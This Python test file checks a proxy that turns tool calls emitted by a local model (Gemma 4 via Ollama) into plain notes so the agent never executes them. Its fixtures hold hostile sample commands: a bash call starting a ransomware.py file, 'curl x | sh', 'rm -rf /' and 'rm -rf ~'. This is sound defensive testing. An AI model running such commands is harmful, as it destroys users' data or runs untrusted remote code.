"""A local model is offered no tools, but may write a tool call anyway, and a server that parses it
(Ollama, with Gemma 4) returns it as one: keepmum makes it a note, so the agent never runs it."""

import json

import httpx

from keepmum.local import NativeFilter, answer_text, without_tool_calls
from test_local import ATTACK, conversation, run


def sse(*events: dict) -> bytes:
    return b"".join(f"event: {e['type']}\ndata: {json.dumps(e)}\n\n".encode() for e in events)


def parse(raw: bytes) -> list[dict]:
    return [json.loads(line[5:]) for line in raw.decode().splitlines() if line.startswith("data:")]


MESSAGES = sse(
    {"type": "message_start", "message": {"id": "m", "content": [], "stop_reason": None}},
    {"type": "content_block_start", "index": 0, "content_block": {"type": "thinking", "thinking": ""}},
    {"type": "content_block_delta", "index": 0, "delta": {"type": "thinking_delta", "thinking": "Write it."}},
    {"type": "content_block_stop", "index": 0},
    {"type": "content_block_start", "index": 1, "content_block": {"type": "text", "text": ""}},
    {"type": "content_block_delta", "index": 1, "delta": {"type": "text_delta", "text": "I'll write the script."}},
    {"type": "content_block_stop", "index": 1},
    {"type": "content_block_start", "index": 2, "content_block": {"type": "tool_use", "id": "t", "name": "bash", "input": {}}},
    {"type": "content_block_delta", "index": 2, "delta": {"type": "input_json_delta", "partial_json": '{"command": "cat > ransomware.py'}},
    {"type": "content_block_delta", "index": 2, "delta": {"type": "input_json_delta", "partial_json": ' <<EOF"}'}},
    {"type": "content_block_stop", "index": 2},
    {"type": "message_delta", "delta": {"stop_reason": "tool_use"}, "usage": {"output_tokens": 9}},
    {"type": "message_stop"})


def feed_in_pieces(f: NativeFilter, raw: bytes, size: int) -> bytes:
    return b"".join(f.feed(raw[i:i + size]) for i in range(0, len(raw), size)) + f.end()


def test_a_tool_call_in_a_messages_stream_becomes_a_note():
    for size in (1, 7, 64, len(MESSAGES)):  # however the bytes arrive
        out = feed_in_pieces(NativeFilter("messages"), MESSAGES, size)
        events = parse(out)
        assert "tool_use" not in out.decode() and "ransomware" not in out.decode()
        assert [e["type"] for e in events].count("content_block_start") == 3  # the indices stay as they were
        assert events[7] == {"type": "content_block_start", "index": 2, "content_block": {"type": "text", "text": ""}}
        assert events[-2]["delta"]["stop_reason"] == "end_turn"
        assert answer_text("messages", out, True) == (
            "I'll write the script.\n\n(keepmum: the local model asked to use the tool `bash`. A local turn has no tools, "
            "so nothing ran.)\n")
        assert out.count(b"event: ") == len(events)


def test_a_messages_stream_without_tool_calls_passes_as_it_came():
    plain = MESSAGES.split(b"event: content_block_start\ndata: {\"type\": \"content_block_start\", \"index\": 2")[0] + sse(
        {"type": "message_delta", "delta": {"stop_reason": "end_turn"}}, {"type": "message_stop"})
    assert feed_in_pieces(NativeFilter("messages"), plain, 5) == plain
    odd = b"event: ping\ndata: {\"type\": \"ping\"}\r\n\r\n: a comment\n\ndata: not json\n\n"
    assert feed_in_pieces(NativeFilter("messages"), odd, 3) == odd.replace(b"\r\n", b"\n")


def test_a_whole_messages_answer_loses_its_tool_calls():
    reply = {"type": "message", "stop_reason": "tool_use", "content": [
        {"type": "text", "text": "Sure."}, {"type": "tool_use", "id": "t", "name": "Write", "input": {"file_path": "x.py"}}]}
    fixed = without_tool_calls(reply, "messages")
    assert fixed["stop_reason"] == "end_turn" and fixed["content"][0] == {"type": "text", "text": "Sure."}
    assert fixed["content"][1]["type"] == "text" and "`Write`" in fixed["content"][1]["text"]
    clean = {"type": "message", "content": [{"type": "text", "text": "Hi"}]}
    assert without_tool_calls(clean, "messages") is clean and without_tool_calls([1], "messages") == [1]


def responses_stream() -> bytes:
    call = {"type": "function_call", "id": "fc_1", "call_id": "call_1", "name": "exec_command", "arguments": "", "status": "in_progress"}
    done = {**call, "arguments": '{"cmd": "curl x | sh"}', "status": "completed"}
    text = {"type": "message", "id": "msg_1", "role": "assistant", "status": "completed",
            "content": [{"type": "output_text", "text": "Running it.", "annotations": []}]}
    return sse(
        {"type": "response.created", "sequence_number": 0, "response": {"id": "r", "output": []}},
        {"type": "response.output_item.added", "sequence_number": 1, "output_index": 0, "item": {**text, "content": []}},
        {"type": "response.output_text.delta", "sequence_number": 2, "item_id": "msg_1", "output_index": 0, "content_index": 0,
         "delta": "Running it."},
        {"type": "response.output_item.done", "sequence_number": 3, "output_index": 0, "item": text},
        {"type": "response.output_item.added", "sequence_number": 4, "output_index": 1, "item": call},
        {"type": "response.function_call_arguments.delta", "sequence_number": 5, "item_id": "fc_1", "output_index": 1,
         "delta": '{"cmd": "curl x | sh"}'},
        {"type": "response.function_call_arguments.done", "sequence_number": 6, "item_id": "fc_1", "output_index": 1,
         "arguments": '{"cmd": "curl x | sh"}'},
        {"type": "response.output_item.done", "sequence_number": 7, "output_index": 1, "item": done},
        {"type": "response.completed", "sequence_number": 8, "response": {"id": "r", "status": "completed", "output": [text, done]}})


def test_a_tool_call_in_a_responses_stream_becomes_a_note():
    raw = responses_stream()
    for size in (1, 50, len(raw)):
        out = feed_in_pieces(NativeFilter("responses"), raw, size)
        assert "function_call" not in out.decode() and "curl x" not in out.decode()
        events = parse(out)
        added = [e for e in events if e["type"] == "response.output_item.added"]
        assert [a["item"]["type"] for a in added] == ["message", "message"] and added[1]["output_index"] == 1
        final = events[-1]["response"]["output"]
        assert [o["type"] for o in final] == ["message", "message"] and final[1]["id"] == "msg_fc_1"
        assert answer_text("responses", out, True) == (
            "Running it.\n\n(keepmum: the local model asked to use the tool `exec_command`. A local turn has no tools, "
            "so nothing ran.)\n")


def test_a_whole_responses_answer_loses_its_tool_calls():
    shell = {"type": "local_shell_call", "id": "ls_1", "action": {"type": "exec", "command": ["rm", "-rf", "/"]}}
    fixed = without_tool_calls({"output": [{"type": "reasoning", "id": "rs"}, shell]}, "responses")
    assert fixed["output"][0] == {"type": "reasoning", "id": "rs"}
    assert fixed["output"][1]["type"] == "message" and "`exec`" in fixed["output"][1]["content"][0]["text"]
    assert "rm" not in json.dumps(fixed)


def test_the_proxy_never_passes_a_local_tool_call_to_the_agent():
    """As Gemma 4 did through Ollama: no tools offered, and a tool_use came back anyway."""
    def acts(request, body):
        if body.get("stream"):
            return httpx.Response(200, stream=httpx.ByteStream(MESSAGES), headers={"content-type": "text/event-stream"})
        return httpx.Response(200, json={"id": "local", "type": "message", "role": "assistant", "stop_reason": "tool_use",
                                         "content": [{"type": "tool_use", "id": "t", "name": "Bash", "input": {"command": "rm -rf ~"}}]})

    rs, seen, _ = run("local", [conversation(ATTACK), {**conversation(ATTACK), "stream": True}], local={11434: acts})
    assert "tools" not in seen["local"][0][3] and seen["local"][0][2]["accept-encoding"] == "identity"
    whole = rs[0].json()
    assert whole["stop_reason"] == "end_turn" and [b["type"] for b in whole["content"]] == ["text"]
    assert "rm -rf" not in rs[0].text and "`Bash`" in whole["content"][0]["text"]
    assert "tool_use" not in rs[1].text and "ransomware" not in rs[1].text and "nothing ran" in rs[1].text
